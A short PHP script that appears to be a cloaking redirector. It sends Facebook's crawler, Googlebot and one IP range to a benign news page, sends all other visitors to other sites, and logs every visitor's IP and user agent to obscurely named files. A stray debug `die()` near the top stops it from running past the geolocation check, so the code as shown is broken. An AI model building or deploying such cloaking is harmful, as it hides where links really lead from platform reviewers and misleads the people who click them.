
<?php
function checkIP($ip)
{
    $lowIp = ip2long('66.100.0.0');
    $highIp = ip2long('66.255.255.255');
    if ($ip <= $highIp && $lowIp <= $ip) {
        return true;
    }
}

function checkCountry($ip)
{
    $json = file_get_contents("http://freegeoip.net/json/{$ip}");
    return json_decode($json)->country_code;
}

$country = checkCountry($_SERVER['REMOTE_ADDR']);
die(var_dump($country));

$allowedAgents = "allowedAgents7ySEWY2DKflYQAPw6pzTRL4CEhB-vp9qB2fOiSCnAVyeldrIaTeqvbsgXMKMJx06dIiJUaFNZFtj5cZmWsLumG81-7cjPn3XbVkr.txt";
$blockedAgents = "blockedAgents7ySEWY2DKflYQAPw6pzTRL4CEhB-vp9qB2fOiSCnAVyeldrIaTeqvbsgXMKMJx06dIiJUaFNZFtj5cZmWsLumG81-7cjPn3XbVkr.txt";

$ip = ip2long($_SERVER['REMOTE_ADDR']);

if (
    strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/1.1") !== false ||
    strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false || checkIP($ip)
) {
    $fAgent = fopen($blockedAgents, 'a');
    $agent = $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['HTTP_USER_AGENT'] . ' blocked ' . PHP_EOL;
    fwrite($fAgent, $agent);
    fclose($fAgent);
    header('Location: http://trendingnewsportal.pnnews.dev/', true, 301);
    die();
} else {
    $iPod = stripos($_SERVER['HTTP_USER_AGENT'], "iPod");
    $iPhone = stripos($_SERVER['HTTP_USER_AGENT'], "iPhone");
    $iPad = stripos($_SERVER['HTTP_USER_AGENT'], "iPad");
    $Android = stripos($_SERVER['HTTP_USER_AGENT'], "Android");
    $webOS = stripos($_SERVER['HTTP_USER_AGENT'], "webOS");
    if ($iPhone) {
        header('Location: http://philnews.info', true, 301);
        $fAgent = fopen($allowedAgents, 'a');
        $agent = $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['HTTP_USER_AGENT'] . ' ok ' . PHP_EOL;
        fwrite($fAgent, $agent);
        fclose($fAgent);
        die();
    } else {
        $fAgent = fopen($allowedAgents, 'a');
        $agent = $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['HTTP_USER_AGENT'] . ' ok ' . PHP_EOL;
        fwrite($fAgent, $agent);
        fclose($fAgent);
        header('Location: http://vmnet.info', true, 301);
    }
}
